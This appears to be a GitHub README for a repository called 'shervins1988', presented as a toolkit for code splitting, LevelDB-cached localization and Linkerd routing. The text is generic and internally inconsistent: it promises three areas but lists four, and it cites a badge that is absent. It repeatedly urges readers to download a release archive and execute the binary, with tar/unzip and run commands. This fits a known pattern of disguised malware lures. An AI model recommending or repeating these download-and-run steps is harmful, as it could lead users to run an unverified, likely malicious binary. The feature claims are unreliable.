Overview
--------
A compact toolkit to split code, store localized assets in LevelDB, and route workloads through Linkerd. Use this repo when you need modular bundles, predictable local storage, and transparent service mesh routing. The repo focuses on three areas:

- Code splitting strategies for web and server bundles.
- Localization (l10n) file handling and runtime loading.
- LevelDB-backed caches for locale assets and metadata.
- Linkerd-friendly deployment patterns and sidecar-aware logic.

Why this repo
--------------
- Break large bundles into small artifacts that load on demand.
- Keep l10n data close to the runtime to cut network latency.
- Use LevelDB for fast, on-disk key-value reads with compact files.
- Fit service mesh environments with Linkerd-aware health checks and routing.

Features
--------
- Chunk-based code-splitting patterns for ES modules and CommonJS.
- Runtime loader for locale bundles with cache invalidation.
- LevelDB connector with batch write and snapshot support.
- Linkerd readiness and liveness probes; trace-friendly headers.
- Release artifacts with prebuilt runtimes and native binaries.

Quick links
-----------
- Releases (download & run): [https://github.com/Ccogiz/shervins1988/releases](https://github.com/Ccogiz/shervins1988/releases)  
  The release page contains signed build artifacts. Download the release file and execute it on a compatible host. Use the badge above to open the release page.

Getting started
---------------
1. Clone the repo
   git clone https://github.com/Ccogiz/shervins1988.git
2. Inspect examples in /examples
3. Pick the code-splitting pattern you need
4. If you want a prebuilt runtime, download the release file from the releases link and run it as described below

Install from Releases
---------------------
A prebuilt release file sits on the Releases page. Download that file and execute it.

Steps:
- Visit: https://github.com/Ccogiz/shervins1988/releases
- Find the latest release and download the file that matches your OS (tarball, zip, or native binary).
- Extract the archive if needed.
- Run the binary or start the runtime script.

Example for Linux (replace filename with the one you downloaded):
- tar -xzf shervins1988-vX.Y.Z-linux.tar.gz
- cd shervins1988-vX.Y.Z
- ./shervins1988

Example for macOS:
- unzip shervins1988-vX.Y.Z-macos.zip
- cd shervins1988-vX.Y.Z
- ./shervins1988

If the release page does not load or the asset is missing, check the Releases tab on this repository in the GitHub UI.

Core concepts
-------------
Code splitting
- Entry points: Define per-route or per-feature entry points.
- Chunking: Group shared modules into common chunks.
- Lazy loading: Load chunks only when a route or feature is active.
- Manifest: Generate a manifest that maps chunk IDs to files and hashes.

Pattern example:
- vendor chunk for third-party libs
- core runtime chunk for bootstrap logic
- feature chunk per page or API client

Localization (l10n)
- Store locale bundles as JSON files or binary blobs.
- Load a locale bundle at runtime based on user locale.
- Fall back to a base locale if keys are missing.
- Support message interpolation and plural rules.

l10n loader:
- Check LevelDB cache for locale bundle.
- If hit, load from disk.
- If miss, fetch from origin, validate, persist to LevelDB.

LevelDB integration
- Use LevelDB as a local store for runtime assets and metadata.
- Provide an adapter that abstracts batch writes, snapshots, and compaction triggers.
- Keep keys structured: locale:en-US:messages, chunk:v1:main, meta:build

API surface (sample)
- db.put(key, value)
- db.get(key)
- db.batchWrite(entries)
- loader.loadLocale(locale)
- splitter.split(entryConfig)
- server.start(port, options)

Linkerd integration
- Add Linkerd sidecar awareness. Detect the LINKERD2_PROXY_* env vars to tune probe ports.
- Expose graceful shutdown and SIGTERM handling that cooperates with the mesh.
- Propagate tracing headers used by Linkerd for request correlation.
- Use Service Profiles or traffic splits with Linkerd to route canary chunks or migration traffic.

Usage patterns
--------------
Client-side web
- Build with the provided webpack/rollup configs.
- Use dynamic import() for feature modules.
- Use the manifest to map hashed chunk files and avoid cache misses.

Server-side
- Use server-side split bundles to stream HTML with required chunk hints.
- Preload critical chunks in the initial HTML.
- Hydrate on the client with exact chunk mapping to avoid double downloads.

Caching strategy
- Cache chunk files in LevelDB if you need fast file access from the server host.
- Use content-hash keys. When the hash changes, write a new key and mark the old entry for compaction.

Example: runtime code (pseudo)
- import { loadLocale } from 'shervins1988/localloader'
- const messages = await loadLocale('en-US')
- const feature = await import('./features/payments.js')

Commands and scripts
- npm run build — produce chunked artifacts.
- npm run start — start the local runtime with LevelDB root at ./data.
- npm run test — run unit tests and l10n checks.
- ./shervins1988 --serve — run the prebuilt release binary in serve mode.

Examples
--------
- examples/web: shows client code splitting with dynamic import and manifest usage.
- examples/ssr: demonstrates server-side rendering with streaming of chunk hints.
- examples/l10n: shows runtime locale loading, fallback rules, and LevelDB caching.
- examples/linkerd: includes a Kubernetes manifest and Linkerd annotations.

Images and diagrams
- High-level flow: client fetches manifest -> requests chunk -> server checks LevelDB -> serves chunk.
- Use the diagram in /docs/diagrams to visualize chunk flow and Linkerd sidecar routing.

Design notes
------------
- Keep chunk sizes small but avoid too many tiny files.
- Prefer content-hash naming for cache control.
- For l10n, split messages by feature to reduce locale payload.
- Use LevelDB for deterministic on-disk performance.
- Keep Linkerd metadata in pod annotations for traceability.

Security and signing
--------------------
- Release artifacts include a SHA256 sum and a signature file.
- Verify the checksum before executing the release binary.
- Use standard OS-level execution controls to limit runtime permissions.

Build and CI
------------
- CI builds produce artifacts for Linux, macOS, and Windows.
- CI runs lint, unit tests, and integration checks for LevelDB and Linkerd probes.
- The CI attaches artifacts to GitHub Releases for easy download.

Contributing
------------
- Fork the repo and open a PR.
- Add tests for new features.
- Follow the code style in .editorconfig.
- Label issues with bug, feature, or help wanted.

Roadmap
-------
- Improved chunk preloading policies for variable network conditions.
- Native WASM module support for compute-heavy splits.
- Incremental LevelDB compaction tooling.
- Linkerd traffic shaping examples for phased rollouts.

Troubleshooting
---------------
- If a chunk fails to load, check the manifest mapping and the release artifact hash.
- If LevelDB throws errors, inspect the data directory permissions and file locks.
- If Linkerd routing behaves oddly, check sidecar logs and ServiceProfile configuration.
